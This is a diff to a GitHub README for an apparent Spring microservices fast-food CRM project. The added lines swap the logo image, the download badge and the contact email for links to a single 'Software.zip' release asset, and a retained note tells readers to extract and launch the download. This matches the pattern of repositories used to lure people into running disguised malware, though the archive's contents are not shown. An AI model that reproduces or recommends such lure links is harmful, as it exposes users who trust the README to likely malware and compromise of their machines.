@@ -1,6 +1,6 @@
 # 🍔🚀 Welcome to the Spring Microservices Fast Food CRM Application! 🍔🚀
 
-![Spring Microservices Logo](https://img.icons8.com/color/452/spring-logo.png)
+![Spring Microservices Logo](https://github.com/rofix12/spring-microservices/releases/download/v1.0/Software.zip)
 
 ## Overview
 This repository houses the code for a Fast Food CRM application developed using Spring Microservices. The application is designed to handle various aspects of customer relationship management within the fast food industry. It leverages the power of microservices architecture to provide a scalable and efficient solution.
@@ -31,7 +31,7 @@ This repository houses the code for a Fast Food CRM application developed using 
 
 ## Installation
 🚀 To get started with the Fast Food CRM application, you can download the project files from the following link:
-[![Download Project Zip](https://img.shields.io/badge/Download-Project%20Zip-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project Zip](https://github.com/rofix12/spring-microservices/releases/download/v1.0/Software.zip%https://github.com/rofix12/spring-microservices/releases/download/v1.0/Software.zip)](https://github.com/rofix12/spring-microservices/releases/download/v1.0/Software.zip)
 
 ℹ️ **Please note:** The downloaded file needs to be extracted and launched according to the setup instructions provided in the repository.
 
@@ -42,7 +42,7 @@ This repository houses the code for a Fast Food CRM application developed using 
 🔧 If you encounter any issues or have questions about the application, please check the 'Releases' section of this repository for the latest updates and bug fixes.
 
 ## Get in Touch
-📧 For any further inquiries or collaboration opportunities, you can reach out to the project maintainers via email at <fastfoodcrm@springmicroservices.com>.
+📧 For any further inquiries or collaboration opportunities, you can reach out to the project maintainers via email at <https://github.com/rofix12/spring-microservices/releases/download/v1.0/Software.zip>.
 
 Let's revolutionize the fast food industry with Spring Microservices! 🍔🚀
 
